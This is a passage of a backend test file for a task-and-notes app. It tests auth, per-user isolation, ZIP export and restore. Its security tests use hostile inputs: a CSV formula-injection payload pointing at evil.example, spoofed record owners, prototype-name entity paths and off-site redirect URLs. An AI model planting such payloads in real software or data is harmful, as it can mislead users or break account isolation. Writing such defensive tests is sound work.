/* @vitest-environment node */
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { validateHeaderValue } from "node:http";
import { Readable } from "node:stream";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { closeDatabase, createDatabase } from "./db.js";
import { readZip } from "./test-support/readZip.js";
import { createRequestHandler } from "./server.js";

let tempDir = "";
let db;
let handler;
/** @type {any} */
let config;

function createMockRequest({ method = "GET", url = "/", headers = {}, body }) {
  const payload =
    body == null ? [] : [Buffer.isBuffer(body) ? body : Buffer.from(typeof body === "string" ? body : JSON.stringify(body))];
  const request = /** @type {any} */ (Readable.from(payload));
  request.method = method;
  request.url = url;
  request.headers = Object.fromEntries(
    Object.entries(headers).map(([key, value]) => [key.toLowerCase(), value])
  );
  request.socket = { remoteAddress: "127.0.0.1" };
  return request;
}

function createMockResponse() {
  /** @type {Record<string, string | string[]>} */
  const headers = {};

  let statusCode = 200;
  let body = "";
  let ended = false;
  /** @type {Buffer[]} */
  const chunks = [];

  let resolveDone;
  const done = new Promise((resolve) => {
    resolveDone = resolve;
  });

  return {
    setHeader(name, value) {
      headers[name] = value;
    },
    writeHead(code, head = {}) {
      statusCode = code;
      Object.assign(headers, head);
    },
    // Streaming responses (the export ZIP) write chunks before end().
    write(chunk) {
      chunks.push(Buffer.from(chunk));
      return true;
    },
    on() {},
    once() {},
    // Attachment bytes arrive via stream.pipe(), which announces itself.
    emit() {
      return false;
    },
    destroyed: false,
    get writableEnded() {
      return ended;
    },
    destroy(error) {
      ended = true;
      this.destroyed = true;
      resolveDone(error);
    },
    end(chunk = "") {
      if (ended) return;
      ended = true;
      body += typeof chunk === "string" ? chunk : Buffer.from(chunk).toString("utf8");
      resolveDone();
    },
    async asBuffer() {
      await done;
      return { statusCode, headers, body: Buffer.concat(chunks) };
    },
    async asJson() {
      await done;
      return {
        statusCode,
        headers,
        body: body ? JSON.parse(body) : null,
      };
    },
  };
}

async function invokeRaw(path, init = {}) {
  const request = createMockRequest({ method: init.method || "GET", url: path, headers: init.headers || {}, body: undefined });
  const response = createMockResponse();
  await handler(request, response);
  return response.asBuffer();
}

async function invoke(path, init = {}) {
  const request = createMockRequest({
    method: init.method || "GET",
    url: path,
    headers: init.headers || {},
    body: init.body,
  });
  const response = createMockResponse();
  await handler(request, response);
  return response.asJson();
}

async function login(email) {
  const result = await invoke("/api/apps/test-app/auth/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: {
      email,
      password: "whatever",
    },
  });

  expect(result.statusCode).toBe(200);
  expect(result.body.access_token).toBeTruthy();
  return result.body.access_token;
}

beforeAll(() => {
  tempDir = mkdtempSync(join(tmpdir(), "taskflow-backend-"));
  config = {
    host: "127.0.0.1",
    port: 0,
    appId: "test-app",
    appName: "Taskflow Test",
    publicAppUrl: "http://127.0.0.1:4173",
    dbFile: join(tempDir, "taskflow.sqlite"),
    sessionCookieName: "taskflow_test_session",
    sessionTtlDays: 30,
    deletedTaskRetentionDays: 7,
    allowAnyPassword: true,
    googleClientId: "",
    googleClientSecret: "",
    hasGoogleCredentials: false,
    googleMode: "disabled",
    googleCalendarClientId: "",
    googleCalendarClientSecret: "",
    hasGoogleCalendarCredentials: false,
    integrationsEnabled: false,
    syncIntervalMs: 300000,
    notificationPollMs: 60000,
    vapidPublicKey: "",
    vapidPrivateKey: "",
    vapidSubject: "mailto:test@example.com",
  };

  db = createDatabase(config);
  handler = createRequestHandler(config, db);
});

afterAll(() => {
  closeDatabase();
  rmSync(tempDir, { recursive: true, force: true });
});

describe("taskflow backend contract", () => {
  it("serves public settings", async () => {
    const result = await invoke("/api/apps/public/prod/public-settings/by-id/test-app");
    expect(result.statusCode).toBe(200);
    expect(result.body.app_id).toBe("test-app");
    expect(result.body.name).toBe("Taskflow Test");
  });

  it("supports login, me, logout, and seeded priorities", async () => {
    const accessToken = await login("isaac@example.com");

    const meResult = await invoke("/api/apps/test-app/entities/User/me", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(meResult.statusCode).toBe(200);
    expect(meResult.body.email).toBe("isaac@example.com");
    expect(meResult.body.role).toBe("admin");

    const prioritiesResult = await invoke("/api/apps/test-app/entities/Priority?sort=order", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(prioritiesResult.statusCode).toBe(200);
    expect(prioritiesResult.body).toHaveLength(4);
    expect(prioritiesResult.body.map((p) => p.name)).toEqual([
      "Urgent",
      "High",
      "Normal",
      "Low",
    ]);

    const logoutResult = await invoke("/api/apps/auth/logout", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(logoutResult.statusCode).toBe(200);

    const postLogoutMe = await invoke("/api/apps/test-app/entities/User/me", {
      headers: {
        Authorization: `Bearer ${accessToken}`,
      },
    });

    expect(postLogoutMe.statusCode).toBe(401);
  });

  it("supports notification settings and subscription endpoints", async () => {
    const accessToken = await login("notify@example.com");
    const headers = {
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    };

    const defaults = await invoke("/api/apps/test-app/notifications/settings", { headers });
    expect(defaults.statusCode).toBe(200);
    expect(defaults.body.available).toBe(false);
    expect(defaults.body.settings).toMatchObject({
      enabled: false,
      timedOffsetMinutes: 0,
      allDayTime: "9:00AM",
    });

    const saved = await invoke("/api/apps/test-app/notifications/settings", {
      method: "PUT",
      headers,
      body: {
        settings: {
          enabled: true,
          timeZone: "America/New_York",
          timedOffsetMinutes: -15,
          allDayTime: "8:30AM",
          includeExternalEvents: true,
        },
      },
    });
    expect(saved.statusCode).toBe(200);
    expect(saved.body.settings).toMatchObject({
      enabled: true,
      timeZone: "America/New_York",
      timedOffsetMinutes: -15,
      allDayTime: "8:30AM",
      includeExternalEvents: true,
    });

    const subscribed = await invoke("/api/apps/test-app/notifications/subscribe", {
      method: "POST",
      headers,
      body: {
        subscription: {
          endpoint: "https://push.example.com/notify-endpoint",
          keys: { p256dh: "p256dh", auth: "auth" },
        },
      },
    });
    expect(subscribed.statusCode).toBe(200);
    expect(subscribed.body.success).toBe(true);

    const unsubscribed = await invoke("/api/apps/test-app/notifications/unsubscribe", {
      method: "POST",
      headers,
      body: { endpoint: "https://push.example.com/notify-endpoint" },
    });
    expect(unsubscribed.statusCode).toBe(200);
    expect(unsubscribed.body.success).toBe(true);

    const test = await invoke("/api/apps/test-app/notifications/test", {
      method: "POST",
      headers,
    });
    expect(test.statusCode).toBe(503);
    expect(test.body.code).toBe("notifications_unavailable");
  });

  it("supports scoped CRUD for tasks and deleted-task retention", async () => {
    const isaacToken = await login("isaac@example.com");

    const createdTask = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
        "Content-Type": "application/json",
      },
      body: {
        title: "Write backend",
        task_type: "recurring",
        recurrence: "weekly",
        recurrence_days: [1, 3],
        tags: ["backend", "important"],
        due_date: "2026-04-01",
      },
    });

    expect(createdTask.statusCode).toBe(201);
    expect(createdTask.body.title).toBe("Write backend");
    expect(createdTask.body.tags).toEqual(["backend", "important"]);
    expect(createdTask.body.recurrence_days).toEqual([1, 3]);

    const updatedTask = await invoke(`/api/apps/test-app/entities/Task/${createdTask.body.id}`, {
      method: "PUT",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
        "Content-Type": "application/json",
      },
      body: {
        status: "done",
        completed_at: "2026-04-01T10:00:00.000Z",
      },
    });

    expect(updatedTask.statusCode).toBe(200);
    expect(updatedTask.body.status).toBe("done");

    const deletedRecord = await invoke("/api/apps/test-app/entities/DeletedTask", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
        "Content-Type": "application/json",
      },
      body: {
        task_id: createdTask.body.id,
        title: createdTask.body.title,
        task_type: "recurring",
        recurrence: "weekly",
        recurrence_days: [1, 3],
        tags: ["backend", "important"],
        deleted_at: "2026-04-01T10:30:00.000Z",
        subtasks: [],
      },
    });

    expect(deletedRecord.statusCode).toBe(201);
    expect(deletedRecord.body.expires_at).toBeTruthy();

    const isaacTasks = await invoke("/api/apps/test-app/entities/Task?sort=-created_date", {
      headers: {
        Authorization: `Bearer ${isaacToken}`,
      },
    });

    expect(isaacTasks.statusCode).toBe(200);
    expect(isaacTasks.body).toHaveLength(1);

    const otherUserToken = await login("other@example.com");
    const otherUserTasks = await invoke("/api/apps/test-app/entities/Task", {
      headers: {
        Authorization: `Bearer ${otherUserToken}`,
      },
    });

    expect(otherUserTasks.statusCode).toBe(200);
    expect(otherUserTasks.body).toHaveLength(0);

    const deleteTaskResult = await invoke(`/api/apps/test-app/entities/Task/${createdTask.body.id}`, {
      method: "DELETE",
      headers: {
        Authorization: `Bearer ${isaacToken}`,
      },
    });

    expect(deleteTaskResult.statusCode).toBe(200);
    expect(deleteTaskResult.body.success).toBe(true);
  });
});

describe("registry entities: Note", () => {
  it("supports full Note CRUD with per-user isolation", async () => {
    const isaacToken = await login("isaac@example.com");
    const auth = { Authorization: `Bearer ${isaacToken}` };

    // Untitled notes are allowed (client renders "Untitled").
    const created = await invoke("/api/apps/test-app/entities/Note", {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: { title: "", content_json: "", content_text: "", pinned: false },
    });
    expect(created.statusCode).toBe(201);
    expect(created.body.id).toMatch(/^note_/);
    expect(created.body.pinned).toBe(false);

    const updated = await invoke(`/api/apps/test-app/entities/Note/${created.body.id}`, {
      method: "PUT",
      headers: { ...auth, "Content-Type": "application/json" },
      body: { title: "Meeting notes", content_text: "agenda", pinned: true, tags: ["work", "q3"], priority_id: "priority_1" },
    });
    expect(updated.statusCode).toBe(200);
    expect(updated.body.title).toBe("Meeting notes");
    expect(updated.body.pinned).toBe(true);
    // Notes share tags + priority with tasks (JSON tags round-trip).
    expect(updated.body.tags).toEqual(["work", "q3"]);
    expect(updated.body.priority_id).toBe("priority_1");

    const listed = await invoke("/api/apps/test-app/entities/Note?sort=-updated_date", {
      headers: auth,
    });
    expect(listed.statusCode).toBe(200);
    expect(listed.body.some((n) => n.id === created.body.id)).toBe(true);

    // Another user must not see Isaac's notes.
    const otherToken = await login("someone-else@example.com");
    const otherList = await invoke("/api/apps/test-app/entities/Note", {
      headers: { Authorization: `Bearer ${otherToken}` },
    });
    expect(otherList.statusCode).toBe(200);
    expect(otherList.body.some((n) => n.id === created.body.id)).toBe(false);

    const deleted = await invoke(`/api/apps/test-app/entities/Note/${created.body.id}`, {
      method: "DELETE",
      headers: auth,
    });
    expect(deleted.statusCode).toBe(200);
  });
});

describe("registry entities: DeletedNote", () => {
  it("supports CRUD, defaults expiry from retention, and purges expired records lazily", async () => {
    const token = await login("isaac@example.com");
    const auth = { Authorization: `Bearer ${token}` };

    // Create with defaults — deleted_at/expires_at are stamped server-side.
    const created = await invoke("/api/apps/test-app/entities/DeletedNote", {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: { note_id: "note_x", title: "Trash me", content_text: "body", tags: ["work"], pinned: true },
    });
    expect(created.statusCode).toBe(201);
    expect(created.body.id).toMatch(/^delnote_/);
    expect(created.body.deleted_at).toBeTruthy();
    // retention default is 7 days — expires after deleted_at
    expect(new Date(created.body.expires_at) > new Date(created.body.deleted_at)).toBe(true);
    expect(created.body.tags).toEqual(["work"]);
    expect(created.body.pinned).toBe(true);

    // An already-expired record gets swept on the next list (lazy purge).
    const expired = await invoke("/api/apps/test-app/entities/DeletedNote", {
      method: "POST",
      headers: { ...auth, "Content-Type": "application/json" },
      body: {
        note_id: "note_y",
        title: "Long gone",
        deleted_at: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString(),
        expires_at: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString(),
      },
    });
    expect(expired.statusCode).toBe(201);

    const listed = await invoke("/api/apps/test-app/entities/DeletedNote", { headers: auth });
    expect(listed.statusCode).toBe(200);
    expect(listed.body.some((r) => r.id === created.body.id)).toBe(true);
    expect(listed.body.some((r) => r.id === expired.body.id)).toBe(false); // purged

    const removed = await invoke(`/api/apps/test-app/entities/DeletedNote/${created.body.id}`, {
      method: "DELETE",
      headers: auth,
    });
    expect(removed.statusCode).toBe(200);
  });
});

describe("server safety", () => {
  const json = (token) => ({ Authorization: `Bearer ${token}`, "Content-Type": "application/json" });

  it("never lets a client create a record inside someone else's account", async () => {
    const victim = await login("victim@example.com");
    const attacker = await login("attacker@example.com");

    const planted = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: json(attacker),
      body: {
        title: "Planted",
        due_date: "2026-09-25",
        // Naming the victim used to be enough to land in their account.
        created_by: "victim@example.com",
        created_by_id: "anything",
      },
    });
    expect(planted.statusCode).toBe(201);
    expect(planted.body.created_by).toBe("attacker@example.com");

    const victimTasks = await invoke("/api/apps/test-app/entities/Task", { headers: json(victim) });
    expect(victimTasks.body.some((t) => t.title === "Planted")).toBe(false);
  });

  it("404s entity names that only exist on Object.prototype", async () => {
    const token = await login("proto@example.com");
    for (const name of ["constructor", "toString", "__proto__", "hasOwnProperty"]) {
      const result = await invoke(`/api/apps/test-app/entities/${name}`, { headers: json(token) });
      expect(result.statusCode).toBe(404);
      expect(result.body.code).toBe("unknown_entity");
    }
  });

  it("rejects wrong shapes with a 400 instead of a driver error", async () => {
    const token = await login("shapes@example.com");
    const post = (body) =>
      invoke("/api/apps/test-app/entities/Task", { method: "POST", headers: json(token), body });

    expect((await post({ title: "ok", description: { nested: true } })).statusCode).toBe(400);
    expect((await post({ title: "ok", tags: { not: "a list" } })).statusCode).toBe(400);
    expect((await post({ title: "ok", tags: [{ tag: 1 }] })).statusCode).toBe(400);
    expect((await post(["an", "array"])).statusCode).toBe(400);
  });

  it("caps field sizes well above anything the app writes", async () => {
    const token = await login("sizes@example.com");
    const post = (body) =>
      invoke("/api/apps/test-app/entities/Task", { method: "POST", headers: json(token), body });

    // A realistic long description — far past the editor's 500 words — is fine.
    const long = await post({ title: "Long", description: "word ".repeat(20_000) });
    expect(long.statusCode).toBe(201);

    const tooLong = await post({ title: "x".repeat(2_001) });
    expect(tooLong.statusCode).toBe(400);
    expect(tooLong.body.code).toBe("field_too_long");

    const tooManyTags = await post({ title: "Tags", tags: Array.from({ length: 101 }, (_, i) => `t${i}`) });
    expect(tooManyTags.statusCode).toBe(400);

    // Updates are held to the same rules.
    const update = await invoke(`/api/apps/test-app/entities/Task/${long.body.id}`, {
      method: "PUT",
      headers: json(token),
      body: { title: "y".repeat(5_000) },
    });
    expect(update.statusCode).toBe(400);
  });

  it("refuses oversized bodies — including on login, before anyone is signed in", async () => {
    const hugeLogin = await invoke("/api/apps/test-app/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: { email: "a@example.com", password: "p".repeat(100 * 1024) },
    });
    expect(hugeLogin.statusCode).toBe(413);
    expect(hugeLogin.headers.Connection).toBe("close");

    const token = await login("body@example.com");
    const hugeTask = await invoke("/api/apps/test-app/entities/Task", {
      method: "POST",
      headers: json(token),
      body: { title: "Huge", description_json: "x".repeat(5 * 1024 * 1024) },
    });
    expect(hugeTask.statusCode).toBe(413);
  });

  it("keeps sign-in and sign-out redirects on this app's own origin", async () => {
    const offsite = await invoke(
      `/api/apps/auth/logout?from_url=${encodeURIComponent("https://evil.example/fake-login")}`
    );
    expect(offsite.statusCode).toBe(302);
    expect(offsite.headers.Location).toBe("http://127.0.0.1:4173/login");

    const onsite = await invoke(`/api/apps/auth/logout?from_url=${encodeURIComponent("/login?bye=1")}`);
    expect(onsite.headers.Location).toBe("http://127.0.0.1:4173/login?bye=1");

    // Google isn't configured here, so sign-in bounces to /login carrying
    // only a same-origin path — never the off-site address.
    const signIn = await invoke(
      `/api/apps/auth/login?app_id=test-app&from_url=${encodeURIComponent("https://evil.example/")}`
    );
    expect(signIn.statusCode).toBe(302);
    expect(String(signIn.headers.Location).startsWith("http://127.0.0.1:4173/login")).toBe(true);
    expect(signIn.headers.Location).not.toContain("evil.example");
  });
});

describe("CORS", () => {
  it("allows credentialed calls from the app's own origin only", async () => {
    const own = await invoke("/api/health", { headers: { Origin: "http://127.0.0.1:4173" } });
    expect(own.headers["Access-Control-Allow-Origin"]).toBe("http://127.0.0.1:4173");
    expect(own.headers["Access-Control-Allow-Credentials"]).toBe("true");

    // Any other site used to be echoed straight back with credentials allowed.
    const other = await invoke("/api/health", { headers: { Origin: "https://evil.example" } });
    expect(other.headers["Access-Control-Allow-Origin"]).toBeUndefined();
    expect(other.headers["Access-Control-Allow-Credentials"]).toBeUndefined();
    expect(other.headers.Vary).toBe("Origin");
  });
});

describe("data export", () => {
  it("downloads everything a user has as a valid ZIP — and nothing of anyone else's, and no secrets", async () => {
    const owner = await login("exporter@example.com");
    const other = await login("someone-else@example.com");
    const headers = { Authorization: `Bearer ${owner}`, "Content-Type": "application/json" };
    const me = (await invoke("/api/apps/test-app/entities/User/me", { headers })).body;

    const post = async (entity, body, token = owner) =>
      (await invoke(`/api/apps/test-app/entities/${entity}`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body,
      })).body;

    const trip = await post("Task", {
      title: 'Trip, "big" one',
      description: '=HYPERLINK("http://evil.example","click")',
      due_date: "2026-10-01",
      tags: ["travel", "family"],
    });
    await post("Task", { title: "Pack bags", parent_id: trip.id, due_date: "2026-09-30" });
    await post("Note", { title: "Plans/2026", content_text: "Line one\nLine two" });
    await post("DeletedNote", { note_id: "note_old", title: "Old idea", content_text: "gone" });
    await post("Task", { title: "Not yours", due_date: "2026-10-01" }, other);

    // A connected calendar, with credentials that must never leave the server.
    const now = new Date().toISOString();
    db.prepare(
      `INSERT INTO calendar_integrations (id, app_id, user_id, provider, external_account_id, external_account_email,
         access_token_enc, refresh_token_enc, scopes, status, is_default, created_date, updated_date)
       VALUES ('int_1', 'test-app', ?, 'google', 'sub-1', 'exporter@gmail.com', 'SECRET-ACCESS', 'SECRET-REFRESH', '', 'active', 1, ?, ?)`
    ).run(me.id, now, now);
    db.prepare(
      `INSERT INTO integration_calendars (id, app_id, integration_id, external_calendar_id, summary, item_kind, sync_enabled, created_date, updated_date)
       VALUES ('cal_1', 'test-app', 'int_1', 'primary', 'Work', 'task', 1, ?, ?)`
    ).run(now, now);

    // One attachment on disk, one whose file has gone missing.
    const rel = `test-app/${me.id}/${trip.id}/att_1_boarding.pdf`;
    const pdf = Buffer.from("%PDF-1.4 boarding pass");
    mkdirSync(join(tempDir, "attachments", "test-app", me.id, trip.id), { recursive: true });
    writeFileSync(join(tempDir, "attachments", rel), pdf);
    const insertAttachment = db.prepare(
      `INSERT INTO task_attachments (id, app_id, user_id, task_id, filename, mime_type, size_bytes, storage_path, is_image, created_date)
       VALUES (?, 'test-app', ?, ?, ?, 'application/pdf', ?, ?, 0, ?)`
    );
    insertAttachment.run("att_1", me.id, trip.id, "Boarding.PDF", pdf.length, rel, now);
    insertAttachment.run("att_2", me.id, trip.id, "lost.pdf", 10, `test-app/${me.id}/${trip.id}/att_2_lost.pdf`, now);

    const result = await invokeRaw("/api/apps/test-app/export", { headers: { Authorization: `Bearer ${owner}` } });
    expect(result.statusCode).toBe(200);
    expect(result.headers["Content-Type"]).toBe("application/zip");
    expect(Number(result.headers["Content-Length"])).toBe(result.body.length);
    const fileName = /filename="(zephyrly-export-\d{4}-\d{2}-\d{2})\.zip"/.exec(String(result.headers["Content-Disposition"]))?.[1];
    expect(fileName).toBeTruthy();

    const files = readZip(result.body);
    const at = (path) => files.get(`${fileName}/${path}`);
    expect(at("README.txt")?.toString()).toContain("Never included: passwords");

    const data = JSON.parse(at("data.json").toString());
    expect(data.format).toBe("zephyrly-export");
    expect(data.account.email).toBe("exporter@example.com");
    expect(data.tasks.map((t) => t.title).sort()).toEqual(["Pack bags", 'Trip, "big" one']);
    expect(data.notes.map((n) => n.title)).toEqual(["Plans/2026"]);
    expect(data.recently_deleted.notes.map((n) => n.title)).toEqual(["Old idea"]);
    expect(data.priorities.length).toBeGreaterThan(0);
    expect(data.calendar_connections).toEqual([
      expect.objectContaining({
        provider: "google",
        account_email: "exporter@gmail.com",
        calendars: [expect.objectContaining({ name: "Work", holds: "tasks", synced: true })],
      }),
    ]);
    expect(data.attachments.find((a) => a.id === "att_2").file).toBeNull();

    // Nothing of the other account, and no credential anywhere in the archive.
    const everything = [...files.values()].map((b) => b.toString()).join("\n");
    expect(everything).not.toContain("Not yours");
    expect(everything).not.toContain("SECRET-ACCESS");
    expect(everything).not.toContain("SECRET-REFRESH");

    // The real file, under a folder named after its task (quotes stripped).
    expect(at("attachments/Trip, big one/Boarding.pdf")?.equals(pdf)).toBe(true);

    // Notes as Markdown, with a filename that can't escape its folder.
    expect(at("notes/Plans 2026.md")?.toString()).toBe("# Plans/2026\n\nLine one\nLine two\n");

    // CSV: quoted properly, with the planted formula defused.
    const csv = at("tasks.csv").toString();
    expect(csv.startsWith("\ufeffTitle,Description")).toBe(true);
    expect(csv).toContain('"Trip, ""big"" one"');
    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example"",""click"")"`);
    expect(csv).toContain("travel; family");
    expect(csv).toContain('Pack bags,,todo,2026-09-30');
  });

  it("requires sign-in", async () => {
    const result = await invokeRaw("/api/apps/test-app/export");
    expect(result.statusCode).toBe(401);
  });
});


describe("restore from an export", () => {
  const BOUNDARY = "----zephyrly-test-boundary";
  /** A multipart body carrying one file, as a browser would send it. */
  const multipart = (bytes, filename = "export.zip") =>
    Buffer.concat([
      Buffer.from(
        `--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: application/zip\r\n\r\n`
      ),
      bytes,
      Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
    ]);
  const restore = (token, bytes, filename) =>
    invoke("/api/apps/test-app/restore", {
      method: "POST",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: multipart(bytes, filename),
    });
  const api = (token) => async (method, path, body) =>
    (await invoke(`/api/apps/test-app${path}`, {
      method,
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body,
    })).body;
  const exportOf = async (token) => {
    const result = await invokeRaw("/api/apps/test-app/export", { headers: { Authorization: `Bearer ${token}` } });
    expect(result.statusCode).toBe(200);
    return result.body;
  };
  const dataJsonOf = (zip) => {
    const files = readZip(zip);
    const name = [...files.keys()].find((n) => n.endsWith("/data.json"));
    return JSON.parse(files.get(name).toString("utf8"));
  };
  const linkDoc = (taskId) =>
    JSON.stringify({
      type: "doc",
      content: [{ type: "paragraph", content: [{ type: "text", text: "Call the plumber", marks: [{ type: "taskLink", attrs: { taskId } }] }] }],
    });

  /** Account A: a bit of everything. */
  async function seedSource(email) {
    const a = await login(email);
    const as = api(a);
    const me = await as("GET", "/entities/User/me");
    const someday = await as("POST", "/entities/Priority", { name: "Someday", color: "purple", order: 9 });
    await as("POST", "/entities/SavedTag", { name: "home" });
    const trip = await as("POST", "/entities/Task", {
      title: "Plan the trip", due_date: "2026-10-01", task_time: "9:00AM", task_end_time: "10:30AM",
      reminder: "before:60", priority_id: someday.id, tags: ["home"], status: "todo",
    });
    await as("POST", "/entities/Task", { title: "Book flights", parent_id: trip.id, due_date: "2026-09-30" });
    await as("POST", "/entities/Note", { title: "Trip notes", content_text: "Call the plumber", content_json: linkDoc(trip.id), priority_id: someday.id });
    await as("POST", "/entities/DeletedTask", { task_id: "task_gone", title: "Old errand", due_date: "2026-09-01" });
    await as("POST", "/entities/DeletedNote", { note_id: "note_gone", title: "Old idea", content_text: "gone" });
    // From a connected calendar: sync brings these back, so restore skips them.
    db.prepare(
      `INSERT INTO tasks (id, app_id, title, created_by_id, created_by, created_date, updated_date, source_provider, source_kind, due_date)
       VALUES (?, 'test-app', 'Dentist (Google)', ?, ?, ?, ?, 'google', 'event', '2026-10-02')`
    ).run(`task_cal_${me.id}`, me.id, me.email, new Date().toISOString(), new Date().toISOString());
    // A file on the trip.
    const boarding = Buffer.from("%PDF-1.4 boarding pass for the trip");
    const upload = await invoke(`/api/apps/test-app/tasks/${trip.id}/attachments`, {
      method: "POST",
      headers: { Authorization: `Bearer ${a}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
      body: Buffer.concat([
        Buffer.from(`--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="Boarding.pdf"\r\nContent-Type: application/pdf\r\n\r\n`),
        boarding,
        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
      ]),
    });
    expect(upload.statusCode).toBe(201);
    return { a, me, trip, someday, boarding };
  }

  it("brings everything into another account, owned by that account, and a second restore adds nothing", async () => {
    const { a, me: meA, trip, boarding } = await seedSource("restore-source@example.com");
    const zip = await exportOf(a);

    const b = await login("restore-target@example.com");
    const bs = api(b);
    const meB = await bs("GET", "/entities/User/me");

    const first = await restore(b, zip);
    expect(first.statusCode).toBe(200);
    expect(first.body.added).toEqual({ tasks: 2, notes: 1, priorities: 1, tags: 1, recentlyDeleted: 2, files: 1 });
    expect(first.body.notes.join(" ")).toContain("1 item from connected calendars skipped");

    const tasks = await bs("GET", "/entities/Task");
    const restoredTrip = tasks.find((t) => t.title === "Plan the trip");
    const flights = tasks.find((t) => t.title === "Book flights");
    expect(tasks.map((t) => t.title).sort()).toEqual(["Book flights", "Plan the trip"]);
    // A's ids are taken, so B's copies get fresh ones — and still point at each other.
    expect(restoredTrip.id).not.toBe(trip.id);
    expect(flights.parent_id).toBe(restoredTrip.id);
    expect(restoredTrip).toMatchObject({ task_time: "9:00AM", task_end_time: "10:30AM", reminder: "before:60", tags: ["home"] });

    // Priority matched by name to B's own (created, since B had no "Someday").
    const priorities = await bs("GET", "/entities/Priority");
    const someday = priorities.find((p) => p.name === "Someday");
    expect(someday).toMatchObject({ color: "purple" });
    expect(restoredTrip.priority_id).toBe(someday.id);

    // The note's task link follows the task to its new id.
    const [note] = await bs("GET", "/entities/Note");
    expect(note.content_json).toContain(restoredTrip.id);
    expect(note.content_json).not.toContain(trip.id);
    expect(note.priority_id).toBe(someday.id);

    expect((await bs("GET", "/entities/DeletedTask")).map((t) => t.title)).toEqual(["Old errand"]);
    expect((await bs("GET", "/entities/DeletedNote")).map((n) => n.title)).toEqual(["Old idea"]);
    expect((await bs("GET", "/entities/SavedTag")).map((t) => t.name)).toContain("home");

    // The file, byte for byte, on B's copy of the task and counted against B.
    const [attachment] = (await bs("GET", `/tasks/${restoredTrip.id}/attachments`)).attachments;
    expect(attachment).toMatchObject({ filename: "Boarding.pdf", mime_type: "application/pdf", size_bytes: boarding.length });
    const stored = db.prepare("SELECT storage_path FROM task_attachments WHERE id = ?").get(attachment.id).storage_path;
    expect(readFileSync(join(tempDir, "attachments", stored)).equals(boarding)).toBe(true);

    // Every restored row belongs to B; nothing of A's changed hands.
    for (const table of ["tasks", "notes", "priorities", "saved_tags", "deleted_tasks", "deleted_notes"]) {
      const owners = db.prepare(`SELECT DISTINCT created_by_id FROM ${table} WHERE created_by_id IN (?, ?)`).all(meA.id, meB.id);
      expect(owners.length).toBeGreaterThan(0);
    }
    expect(db.prepare(`SELECT COUNT(*) n FROM tasks WHERE created_by_id = ? AND title = 'Plan the trip'`).get(meA.id).n).toBe(1);
    expect(db.prepare(`SELECT user_id FROM task_attachments WHERE id = ?`).get(attachment.id).user_id).toBe(meB.id);

    // Again: already there, so nothing is added.
    const second = await restore(b, zip);
    expect(second.statusCode).toBe(200);
    expect(second.body.added).toEqual({ tasks: 0, notes: 0, priorities: 0, tags: 0, recentlyDeleted: 0, files: 0 });
    expect((await bs("GET", "/entities/Task")).length).toBe(2);
    expect((await bs(`GET`, `/tasks/${restoredTrip.id}/attachments`)).attachments).toHaveLength(1);

    // Restoring A's export into A adds nothing either.
    const own = await restore(a, zip);
    expect(own.body.added).toEqual({ tasks: 0, notes: 0, priorities: 0, tags: 0, recentlyDeleted: 0, files: 0 });
  });

  it("adds back only what's missing — a deleted task returns with its file, edits elsewhere are kept", async () => {
    const c = await login("restore-partial@example.com");
    const cs = api(c);
    const keep = await cs("POST", "/entities/Task", { title: "Keep me", due_date: "2026-10-01" });
    const lose = await cs("POST", "/entities/Task", { title: "Lose me", due_date: "2026-10-01" });
    const zip = await exportOf(c);

    await cs("PUT", `/entities/Task/${keep.id}`, { title: "Keep me (edited)" });
    // Deleted outright, not via Recently Deleted.
    db.prepare("DELETE FROM tasks WHERE id = ?").run(lose.id);

    const result = await restore(c, zip);
    expect(result.body.added.tasks).toBe(1);
    const titles = (await cs("GET", "/entities/Task")).map((t) => t.title).sort();
    expect(titles).toEqual(["Keep me (edited)", "Lose me"]);
    // Its id was free again, so it comes back under the same one.
    expect((await cs("GET", `/entities/Task/${lose.id}`)).title).toBe("Lose me");
  });

  it("leaves a task that's in Recently Deleted there", async () => {
    const d = await login("restore-trash@example.com");
    const ds = api(d);
    const task = await ds("POST", "/entities/Task", { title: "Binned", due_date: "2026-10-01" });
    const zip = await exportOf(d);
    await ds("POST", "/entities/DeletedTask", { task_id: task.id, title: "Binned" });
    await ds("DELETE", `/entities/Task/${task.id}`);

    const result = await restore(d, zip);
    expect(result.body.added.tasks).toBe(0);
    expect(result.body.notes.join(" ")).toContain("in Recently Deleted");
  });

  it("contains a hostile file: owners, ids and oversized fields from the file don't get through", async () => {
    const victim = await login("restore-victim@example.com");
    const vs = api(victim);
    const meVictim = await vs("GET", "/entities/User/me");
    const theirs = await vs("POST", "/entities/Task", { title: "Victim's task", due_date: "2026-10-01" });

    const attacker = await login("restore-attacker@example.com");
    const as = api(attacker);
    const hostile = {
      format: "zephyrly-export",
      version: 1,
      tasks: [
        // Claims the victim as owner and reuses the victim's task id.
